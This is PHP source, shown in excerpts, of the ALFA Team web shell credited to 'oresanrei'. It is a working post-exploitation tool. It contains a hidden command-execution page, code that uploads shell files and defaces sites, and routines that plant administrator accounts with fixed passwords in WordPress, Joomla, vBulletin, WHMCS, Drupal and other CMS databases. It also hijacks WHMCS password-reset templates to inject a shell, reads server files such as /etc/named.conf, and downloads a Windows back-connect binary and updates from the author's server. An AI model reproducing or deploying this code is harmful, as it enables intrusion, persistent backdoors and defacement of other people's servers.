<?php
/*
	Author: 	oresanrei/Alfa-Team
	Telegram: 	https://telegram.me/oresanrei
	YouTube: 	https://youtube.com/oresanrei
	Gmail:		oresanrei@gmail.com
	Date:		Monday, September 14, 2020
*/
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '4a059aa73ede74edb46e462117887c74',//md5(ehsan)
    'safe_mode' => '0',
    'login_page' => '403',
    'show_icons' => '1',
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="http://oresanrei.com/images/alfa-iran.png" /></center>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$out = "";
		if(strpos($data, "[oresanrei~api]") !== false && strpos($data, '[oresanrei~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
...
if(isset($_GET["oresanrei"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>oresanrei Hidden Shell</title>";
...
echo '<hr><form onSubmit="this.execute.disabled=true;this.command_oresanrei.value = btoa(unescape(encodeURIComponent(this.command_oresanrei.value)));" method="POST">Execute Command: <input name="command_oresanrei" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
<hr><pre>';
if(isset($_POST['command_oresanrei'])){
if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
$oresanrei = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_oresanrei']);
echo alfaEx($oresanrei);
}
echo'</pre>
</body></html>';
exit;}
...
$alfa_uploader = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$oresanrei = fopen("oresanrei.php","w");fwrite($oresanrei,$x);';
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?oresanrei"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="http://oresanrei.com/images/alfa-iran.png" /></td>
</tr>
<tr>
...
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_oresanrei"><center><a href="https://t.me/oresanrei" target="_blank"><span><font class="oresanrei-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='http://oresanrei.com/images/btn.png';
	$s['alfamini']='http://oresanrei.com/images/alfamini.png';
	$s['loader']='http://oresanrei.com/images/loader.svg';
...
$curl = new AlfaCURL();
$content = $curl->Send("http://oresanrei.com/market.php");
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="oresanrei"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['alfa5']=='>>'){
echo __pre();
...
echo '<div class="header">';
$news = new AlfaCURL();
$about_us = $news->Send("http://oresanrei.com/aboutus.php");
if(empty($about_us)){
$about_us = "<pre><center><img src='http://oresanrei.com/images/farvahar-iran.png'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br>
<font color='#00A220'>Contact : oresanrei@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @oresanrei</font><br>
...
</center></pre><iframe src='tg://resolve?domain=oresanrei' frameborder='0' width='0' height='0'></iframe>";
}
echo __pre().$about_us;
echo('</div>');
alfafooter();
...
$create = "insert into tblclients (email) values('oresanrei@fbi.gov')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=oresanrei@fbi.gov");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$oresanrei = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
__alert("shell injectet...");
$ff= 'http://'.$path."/oresanrei.php";
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>oresanrei@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/oresanrei.php' target='_blank'>".$path."/oresanrei.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
...
if($res){
$ff = 'http://'.$realurl.$realpath."/oresanrei.php";
output($ff);
}else{
$ff = 'http://'.$realurl.$realpath."/calendar.php";
$fff = 'http://'.$realurl.$realpath."/oresanrei.php";
...
function alfacheckupdate(){
	...
	if(function_exists("curl_version")){
		$update = new AlfaCURL();
		$json = $update->Send("http://oresanrei.com/update.json?ver=".__ALFA_VERSION__);
		...
		if($json){
			...
			if(isset($json["oresanrei"]) && !empty($json["oresanrei"])){
				$data["oresanrei"] = $json["oresanrei"];
			}
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://oresanrei.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
<div id='rightclick_menu'>
  <a target='_blank' href='' name='newtab'><img src=\"http://oresanrei.com/icons/menu/newtab.svg\"> Open in new tab</a>
  <a target='_blank' href='' name='link'><img src=\"http://oresanrei.com/icons/menu/link.svg\"> Open file directly</a>
  <a href='javascript:void(0);' name='download'><img src=\"http://oresanrei.com/icons/menu/download2.svg\"> Download</a>
  <a href='' name='view'><img src=\"http://oresanrei.com/icons/menu/view.svg\"> View</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"http://oresanrei.com/icons/menu/view.svg\"> View Archive</a>
  <a href='' name='edit'><img src=\"http://oresanrei.com/icons/menu/edit.svg\"> Edit</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://oresanrei.com/icons/menu/move.svg\"> Move</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://oresanrei.com/icons/menu/copy.svg\"> Copy</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"http://oresanrei.com/icons/menu/rename.svg\">  Rename</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"http://oresanrei.com/icons/menu/time.svg\">  Modify</a>
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"permission\");' name='permission'><img src=\"http://oresanrei.com/icons/menu/key.svg\"> Change Permissions</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"http://oresanrei.com/icons/menu/resize.svg\"> Compress</a>
  <a href='javascript:void(0);' onclick='alfaSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"http://oresanrei.com/icons/menu/increase.svg\"> Extract</a>
  <a href='javascript:void(0);' name='delete'><img src=\"http://oresanrei.com/icons/menu/delete.svg\"> Delete</a>
</div>
...
if(isset($_POST['alfa6'])){
$s0levisible="Powered By oresanrei";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
$deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $oresanrei = fopen("'.$fname.'","w"); fwrite($oresanrei,$x);';
...
echo __pre();
$oresanrei9 = _alfa_file('/etc/named.conf');
if(is_array($oresanrei9)){
foreach($oresanrei9 as $oresanrei13){
if(@eregi('zone',$oresanrei13)){
preg_match_all('#zone "(.*)"#',$oresanrei13,$oresanrei14);
if(strlen(trim($oresanrei14[1][0])) > 2){
echo $oresanrei14[1][0].'<br>';
}}}
}
}else{
echo __pre();
...
if($lang=='bcwin'){
$alfa = new AlfaCURL();
$s = $alfa->Send('http://oresanrei.com/bc/windows.exe');
$tmpdir = ALFA_TEMPDIR;
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'oresanrei', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'oresanrei@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$oresanrei=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
$oresanrei=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
$sole = @mysqli_num_rows($oresanrei);
if ($sole == 1){
$solevis = @mysqli_fetch_assoc($oresanrei);
$res = $solevis['ID'];
}
$oresanrei=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','oresanrei'),(null,'".$res."','last_name','oresanrei'),(null,'".$res."','nickname','oresanrei'),(null,'".$res."','description','oresanrei'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
if($oresanrei){
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'oresanrei', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'oresanrei@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$oresanrei=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
$oresanrei=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
$sole =@mysqli_num_rows($oresanrei);
if ($sole == 1){
$solevis =@mysqli_fetch_assoc($oresanrei);
$res = $solevis['id'];
}
$oresanrei=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
if($oresanrei){
__alert('Success... '.$admin.' is created...');}
}
}
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'oresanrei', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'oresanrei@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$adm_perm = "16744444";
if($pw_col > 0){
$oresanrei=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
}else{
$adm_perm = "2143256444";
$oresanrei=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
}
$oresanrei=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($oresanrei);
if($sole == 1){
$solevis = mysqli_fetch_assoc($oresanrei);
$res = $solevis['userid'];
}
$oresanrei=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
if($oresanrei){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5('oresanrei');
$oresanrei=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$oresanrei=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$oresanrei=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
$oresanrei=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
$oresanrei=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
if($oresanrei){
__alert('Success... '.$admin.' is created...');
}
}
...
$SQL = $_POST['alfa9'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$oresanrei=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
if($oresanrei){
__alert('Success... '.$admin.' is created...');}
}
}
...
$prefix = $_POST['alfa10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$oresanrei=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
if($oresanrei){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5($pwd);
$oresanrei=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
if($oresanrei){
__alert('Success... '.$admin.' is created...');}
}
}
...
$oresanrei=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','oresanrei@fbi.gov','filtered_html','1','Europe/Berlin','oresanrei@fbi.gov')") or die(mysqli_error($conn));
$oresanrei=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($oresanrei);
if ($sole == 1){
$solevis = mysqli_fetch_assoc($oresanrei);
$res = $solevis['uid'];
}
$oresanrei=@mysqli_query($conn,"INSERT INTO users_roles (uid,rid) VALUES ('".$res."', '3')") or die(mysqli_error($conn));
if($oresanrei){
__alert('Success... '.$admin.' is created...');}
}
}
...
$admin = $_POST['alfa8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$setpwAlg = sha1(strtolower($admin) . 'oresanrei');
$oresanrei=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','oresanrei@fbi.gov')") or die(mysqli_error($conn));
if($oresanrei){
__alert('Success... '.$admin.' is created...');}
}
}
...
if($sole){
	foreach($sole as $visible){
		if(@strstr($visible,":")){
			$oresanrei = explode(':', $visible);
			$cwd = str_replace("{user}", trim($oresanrei[1]), $makepwd);
			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($oresanrei[1]), trim($oresanrei[0]), $cwd), $template);
		}
	}
}else{
...
break;
case 'pgsql':
$this->query("CREATE TABLE oresanrei(file text);COPY oresanrei FROM '".addslashes($str)."';select file from oresanrei;");
$r=array();
while($i=$this->fetch())
$r[] = $i['file'];
$this->query('drop table oresanrei');
...
echo "<div class=header>";
echo "
<center><p><img src=\"http://oresanrei.com/images/farvahar-iran.png\"></p>";
